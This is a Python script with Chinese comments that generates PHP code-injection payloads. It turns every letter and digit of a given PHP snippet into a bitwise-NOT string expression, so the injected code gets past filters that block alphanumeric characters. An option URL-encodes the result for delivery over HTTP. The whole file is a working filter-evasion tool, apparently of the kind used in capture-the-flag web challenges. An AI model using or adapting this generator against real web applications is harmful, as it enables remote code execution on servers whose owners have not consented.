#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
gen_neg.py  ---  取反法 payload 生成器

把输入代码里的【字母和数字】替换成取反表达式, 其余字符原样保留。
字母数字取反后必落在 0x80-0xFF, 一定是非字母数字, 所以这个方法不需要任何搜索。

输入:  phpinfo();
输出:  (~'<0x90><0x97>...')();

注意: 输出含原始高位字节。若通过 URL 传送, 用 -u 得到 %XX 形态(会被 HTTP 层解码回原始字节)。
      但 %XX 的字面文本里带数字和字母 F, 只有在"过滤器作用于解码后内容"时才安全。

用法:
    python gen_neg.py "phpinfo();"
    python gen_neg.py -u "phpinfo();"      # 输出 %XX 形态
    echo "phpinfo();" | python gen_neg.py
"""
import sys
import string
import urllib.parse

ALNUM = set(string.ascii_letters + string.digits)
ID_START = set(string.ascii_letters) | {"_"}
ID_CHAR = set(string.ascii_letters + string.digits) | {"_"}
DIGITS = set(string.digits)


def phpq(c):
    if c == "'":
        return '"\'"'
    if c == '"':
        return "'\"'"
    if c == "\\":
        return '"\\\\"'
    return "'" + c + "'"


def char_expr(c):
    """单个字母/数字 -> (~'<取反字节>')"""
    return "(~'" + chr((~ord(c)) & 0xFF) + "')"


def build(s):
    if not s:
        return "''"
    return ".".join(char_expr(ch) if ch in ALNUM else phpq(ch) for ch in s)


def translate(code):
    out = []
    i, n = 0, len(code)
    while i < n:
        c = code[i]

        if c in "'\"":
            j = i + 1
            buf = []
            while j < n and code[j] != c:
                if code[j] == "\\" and j + 1 < n:
                    buf.append(code[j + 1])
                    j += 2
                    continue
                buf.append(code[j])
                j += 1
            out.append("(" + build("".join(buf)) + ")")
            i = j + 1
            continue

        if c == "$":
            k = i + 1
            j = k
            while j < n and code[j] in ID_CHAR:
                j += 1
            if j > k:
                out.append("${" + build(code[k:j]) + "}")
                i = j
                continue
            out.append(c)
            i += 1
            continue

        if c in ID_START:
            j = i
            while j < n and code[j] in ID_CHAR:
                j += 1
            out.append("(" + build(code[i:j]) + ")")
            i = j
            continue

        if c in DIGITS:
            j = i
            while j < n and code[j] in DIGITS:
                j += 1
            out.append("(" + build(code[i:j]) + ")")
            i = j
            continue

        out.append(c)
        i += 1
    return "".join(out)


def to_pct(p):
    """原始字节 -> %XX 形态"""
    return urllib.parse.quote(p.encode("latin-1"), safe="")


def main():
    args = sys.argv[1:]
    pct = False
    if "-u" in args:
        pct = True
        args.remove("-u")
    code = args[0] if args else sys.stdin.read()
    code = code.rstrip("\r\n")
    p = translate(code)
    if pct:
        sys.stdout.buffer.write((to_pct(p) + "\n").encode("ascii"))
        return
    # 原始字节直出, 单字节 latin-1
    sys.stdout.buffer.write(p.encode("latin-1") + b"\n")


if __name__ == "__main__":
    main()
